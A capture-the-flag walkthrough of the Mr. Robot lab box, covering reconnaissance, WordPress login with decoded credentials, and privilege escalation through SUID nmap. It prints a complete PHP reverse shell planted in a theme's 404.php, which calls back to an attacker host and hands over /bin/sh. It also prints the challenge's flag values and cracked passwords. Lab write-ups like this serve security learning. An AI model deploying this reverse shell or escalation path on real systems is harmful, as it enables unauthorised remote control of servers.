
#  Mr. Robot CTF Writeup — A Journey Through fsociety


<img width="1909" height="359" alt="Screenshot 2025-11-18 190437" src="https://github.com/user-attachments/assets/51856186-f691-44ff-8f48-63e4f2cc5d3a" />


> “Hello friend. If you've come, you've come for a reason.”  
> — Mr. Robot

This one hit different. Not just because it’s based on the show that got half of us into cybersecurity, but because it’s a full-circle moment—solving the box that once felt out of reach. Let’s walk through it, step by step.




---

##  Initial Recon: 

```bash
nmap 10.201.14.1
```


<img width="545" height="213" alt="Screenshot 2025-11-18 165955" src="https://github.com/user-attachments/assets/210cd993-d06e-4494-9b10-a773c41e9c9a" />



- Ports open:  
  - 22/tcp → SSH  
  - 80/tcp → HTTP  
  - 443/tcp → HTTPS

The web app ? OMG! Pure nostalgia. Terminal-style interface, fsociety IRC logs, cryptic commands like `prepare`, `inform`, `wakeup`. All static, but it sets the mood.


<img width="1912" height="716" alt="Screenshot 2025-11-18 150904" src="https://github.com/user-attachments/assets/0e38eec5-3bb5-485f-af07-130ebfdd9d90" />





---

##  Directory Fuzzing: FFUF Unleashed
found nothing on website? FUZZ THE DIRECTORYY !!



```bash
ffuf -u https://10.201.14.1/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100
```




<img width="877" height="360" alt="Screenshot 2025-11-18 170000" src="https://github.com/user-attachments/assets/96fc6c49-22d9-44ce-af1d-51487ec5a45f" />
<img width="772" height="708" alt="Screenshot 2025-11-18 165932" src="https://github.com/user-attachments/assets/4359957c-34d3-452b-bc42-666e48a24965" />





we can notice wordpress is used. we also found some interesting things, 
I checked many of them which lead me to keys which we want..  lets see all of them step by step :

---

##  Key 1: 
first step ? robots.txt offcourse !! I always check it first.



<img width="1920" height="1080" alt="Screenshot_2025-11-18_15_24_44" src="https://github.com/user-attachments/assets/77f87845-273c-455e-b4c7-a198999f2117" />



```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
I guess we got our first keyy !!

Visiting `/key-1-of-3.txt`:


<img width="1920" height="1080" alt="Screenshot_2025-11-18_15_24_55" src="https://github.com/user-attachments/assets/cbbed416-6f8a-4b9d-ad65-1e1e5d4f8d66" />


```text
073403c8a58a1f80d943455fb30724b9
```

Boom. First key in the bag.

---

##  Enumeration: fsocity.dic & License

Saved `fsocity.dic` . it was list of usernames.. repetitive and very long dictionary of usernames.

Then `/license` dropped something interesting. first i thought there is nothing but when i scrolled I got jackpot.


<img width="1914" height="874" alt="Screenshot_2025-11-18_15_29_50" src="https://github.com/user-attachments/assets/cb3b591a-1efa-4d5a-a981-66df00562592" />



<img width="387" height="154" alt="Screenshot 2025-11-18 170744" src="https://github.com/user-attachments/assets/5ad81d38-09b3-47ee-af01-a17949f7dbcf" />



<img width="331" height="91" alt="Screenshot 2025-11-18 170755" src="https://github.com/user-attachments/assets/a96b85ea-90c4-4719-86c7-2426f6820281" />



```text
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoded it using CyberChef:


<img width="241" height="107" alt="Screenshot 2025-11-18 161602" src="https://github.com/user-attachments/assets/98522782-d5f7-4222-8dc1-45c8c25a3e7e" />


```text
elliot:ER28-0652
```

That’s probably our WordPress creds.

Elliot huh? lets go!

---

##  Login: WordPress Admin Access

Visited `/wp-login.php`, 


<img width="1650" height="823" alt="Screenshot 2025-11-18 170655" src="https://github.com/user-attachments/assets/9e002fad-f419-4564-a3a0-97fffd390195" />


Plugged in Elliot’s creds, and we’re in.


<img width="1920" height="1080" alt="Screenshot_2025-11-18_17_08_17" src="https://github.com/user-attachments/assets/256d3c8c-2a8e-4510-aaac-43138f6499a2" />



I checked all the functionailties here.. discovered many things but found something in appearance section.. we can edit various php files and execute them. 

Time for RCE shell.


Dashboard access → theme editor → 404.php ripe for RCE.


<img width="1920" height="1080" alt="Screenshot_2025-11-18_17_02_18" src="https://github.com/user-attachments/assets/e5bf44e9-423d-43de-ae59-3f8d0d320ca2" />


---

##  Reverse Shell via Theme Editor

Injected PHP reverse shell into `404.php`. 
script I used : ( change cred. )
```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Listener on Netcat:

```bash
nc -lvnp 4444
```

I triggered via browser :

<img width="507" height="244" alt="Screenshot 2025-11-18 170033" src="https://github.com/user-attachments/assets/553f8af6-ee9c-4a8c-8eb3-ad31baca2018" />

and shell popped as `daemon`.


<img width="956" height="385" alt="Screenshot 2025-11-18 164015 - Copy" src="https://github.com/user-attachments/assets/fb06f86a-d068-4343-bb3e-6053b778640d" />


In `/home/robot`:
I found second key but we dont have permission to read it.. maybe 'robot' user have. there is another file which is md5 hash of some password. lets see it


<img width="371" height="49" alt="Screenshot 2025-11-18 185516" src="https://github.com/user-attachments/assets/882c5f3d-8a0b-4126-8762-2ff903d9e920" />
<img width="457" height="101" alt="Screenshot 2025-11-18 185537" src="https://github.com/user-attachments/assets/9ebefcf8-c9b5-40b1-8f6b-fe2ead6c5ecf" />



Cracked via CrackStation:

<img width="1366" height="125" alt="Screenshot 2025-11-18 170335" src="https://github.com/user-attachments/assets/1b954202-efb9-49d9-980c-8bb4568dd47d" />


```text
robot:c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

Then I switched user:

```bash
su robot
```


<img width="415" height="137" alt="Screenshot 2025-11-18 164429" src="https://github.com/user-attachments/assets/60e5cac8-854d-45de-92f4-ddecc10878cb" />


And we got second key:


<img width="435" height="104" alt="Screenshot 2025-11-18 164512" src="https://github.com/user-attachments/assets/d29e1c74-794b-4948-9594-25f1bdd74a03" />



```text
822c73956184f694993bede3eb39f959
```

---

##  Root Privilege Escalation: 
As only last key left.. it must be in root directory so prevsec is necessary.
after some enumeration when i checked for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

<img width="565" height="333" alt="Screenshot 2025-11-18 165056" src="https://github.com/user-attachments/assets/e4f7059f-d7b8-4aad-aaf5-49e40d1e0d91" />


Found `/usr/local/bin/nmap`. Which is unusual.

And here comes GTFObins to the rescue:


<img width="1471" height="645" alt="Screenshot 2025-11-18 165349" src="https://github.com/user-attachments/assets/ade40ff2-03b9-455b-96b8-372855d60f7c" />


```bash
nmap --interactive
nmap> !sh
```


<img width="485" height="150" alt="Screenshot 2025-11-18 165427" src="https://github.com/user-attachments/assets/67a0e1c5-21b9-4ea1-b57c-df5bcf0a68de" />


Root shell. No frills.

---

##  Final Key: Root Directory
Easy thing.

```bash
cd /root
cat key-3-of-3.txt
```


<img width="390" height="158" alt="Screenshot 2025-11-18 165509" src="https://github.com/user-attachments/assets/dfea7461-e1fb-4463-a9e5-51c924a8b78a" />



```text
04787ddef27c3deelee161b21670b4e4
```

Challenge complete. All three keys collected.

---

##  Closing Thoughts


This box wasn’t just a technical exploit—it was a tribute. To the show, to the early days, to the spark that got us into this field.


> “There are things you want to say. Soon I will give you a voice.”  
> — Mr. Robot

We found that voice. And we rooted the box.

---
